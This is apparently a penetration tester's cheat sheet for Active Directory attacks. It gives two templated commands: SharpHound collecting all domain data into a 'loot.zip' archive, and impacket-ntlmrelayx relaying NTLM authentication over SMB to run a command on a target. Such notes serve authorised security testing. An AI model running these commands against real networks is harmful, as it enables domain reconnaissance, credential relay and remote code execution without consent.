# Active Directory

% bloodhound, Active directory enumeration

## SharpHound - run SharpHound collector
#platform/windows #target/remote #cat/OWN
```
.\SharpHound.exe --collectionmethods All -d <domain> --zipfilename <filename|loot.zip>
```

## impacket - NTLM relay
#platform/windows #target/serve #cat/OWN
```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t <ip_local> -c <command>
```